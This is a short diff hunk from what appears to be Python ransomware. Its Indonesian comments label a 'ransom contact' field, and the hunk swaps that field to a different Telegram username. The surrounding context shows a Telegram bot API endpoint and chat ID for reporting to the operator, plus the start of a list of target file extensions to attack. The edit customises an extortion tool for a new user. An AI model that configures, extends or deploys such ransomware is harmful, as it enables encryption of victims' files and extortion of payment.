@@ -37,7 +37,7 @@ CHAT_ID = "6921293154"
 URL_BOT = f"https://api.telegram.org/bot{TOKEN_BOT}/"
 
 # KONTAK UNTUK TEBUSAN (GANTI DENGAN USERNAME TELEGRAM ANDA)
-KONTAK_TEBUSAN = "@anon5372"  # Ganti dengan username Anda
+KONTAK_TEBUSAN = "@joyloughtgt"  # Ganti dengan username Anda
 
 # Target ekstensi file
 TARGET_EXTENSIONS = [
